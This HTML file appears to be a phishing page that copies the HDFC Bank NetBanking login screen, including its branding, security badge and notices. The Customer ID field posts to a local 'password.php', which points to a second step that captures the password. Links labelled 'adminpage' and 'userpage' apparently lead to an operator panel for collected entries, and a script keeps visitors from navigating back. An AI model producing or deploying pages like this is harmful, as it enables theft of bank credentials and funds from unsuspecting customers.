<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title> Welcome to HDFC Bank NetBanking </title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet"
    integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
  <link href="css/style.css" type="text/css" rel="stylesheet">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500&display=swap" rel="stylesheet">
  <script language="javascript" type="text/javascript">
    function preventBack(){window.history.forward()};
    setTimeout("preventBack()",0);
        window.onunload=function(){null;}
  </script>
</head>


<body style="background: #F3F3F3;">
  <header>
    <img src="images/logo.png" class="img-fluid headImg" alt="">
    <p class="welcomeNote"> Welcome to HDFC Bank NetBanking </p>
  </header>

  <section>
    <div class="container">
      <div class="welcmewrap">
        <h3> Login to NetBanking </h3>
        <div class="row mb-2">
          <div class="col-sm-6 col-md-6">
            <div class="d-flex align-items-center flex-wrap">
              <p class="mb-0 me-3" style="margin-top: -20%;"> Customer ID/ User ID </p>
              <div class="d-flex flex-column frgtPwd">
              <form action="password.php" method="GET">
                <input type="text" class="form-control" id="inputField" name="cust_id">
                <a href="#">Forgot Customer ID</a>
                <a href="./check/admin/login.php">adminpage</a>
                <a href="./check/admin/loginu.php">userpage</a>
                <!-- <button class="btn btn-primary w-100 mt-3 mb-2" type="submit" id="continue"> CONTINUE </button> -->
                <input type="submit" class="btn btn-primary w-100 mt-3 mb-2" value="CONTINUE">
                </form>
              </div>
            </div>
          </div>

          <div class="col-md-6 col-sm-6">
            <div class="sectionRght">
              <img src="images/nortonsecurity.png" class="img-fluid" alt="">
              <div class="contentSction" style="margin-top: 15px;">
                <p class="mb-0"> Your security is of utmost importance. </p>
                <a href="#"> Know More... </a>
              </div>
            </div>
          </div>
        </div>

        <div class="row mb-2">
          <div class="col-sm-6 col-md-6">
            <div class="notice">
              <p class="mb-0">
                Dear Customer,
                <br />
                Welcome to the new login page of HDFC Bank NetBanking. <br />
                Its lighter look and feel is designed to give you the best possible user experience. Please continue
                to
                login using your customer ID and password.
              </p>
            </div>
            <h3> Don't have a HDFC Bank Savings Account? </h3>
            <div class="accntCont">
              <a href="#" class="leftCn"> Credit Card only? Login here </a>
              <a href="#" class="rghtCn"> HDFC Ltd. Home Loans? Login here </a>
              <a href="#" class="leftCn"> Prepaid Card only ? Login here </a>
              <a href="#" class="rghtCn"> HDFC Ltd. Deposits? Login here </a>
              <a href="#" class="leftCn"> Retail Loan only? Login here </a>
            </div>
          </div>

          <div class="col-sm-6 col-md-6">
            <div class="contentSction">
              <h4 class="mt-4">
                First Time User?
              </h4>
              <p class="mb-4"> <a href="#"> Register Now </a> for a host of convenient features</p>

              <h4 class="mb-3">
                We have added a host of new features!
              </h4>
              <p class="mb-3"> You can now do so much more: </p>
              <ul>
                <li> Anywhere access through Desktop or mobile </li>
                <li> Enhanced security measures </li>
              </ul>
            </div>
          </div>
        </div>

      </div>
    </div>
  </section>

  <footer>
    <div class="container">
      <div class="foot_cont">
        <p class="me-3 mb-0 text-light"> © Copyright HDFC Bank Ltd. </p>
        <div class="d-flex flex-row foot_notes">
          <a href="#">Terms and Conditions </a>
          <a href="#">Privacy Policy</a>
        </div>
      </div>
    </div>
  </footer>

  <div class="endNote"></div>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
    integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
    crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>

  <script>
    $(document).ready(function () {
      const input = $('#inputField')
      $('#continue').click(function() {
        if (input.val().length === 0) {
          alert("Customer ID  cannot be left blank.")
        }else{
          $('#inputField').prop("disabled", true)
          return false
        }
      })
    })
  </script>
</body>

</html>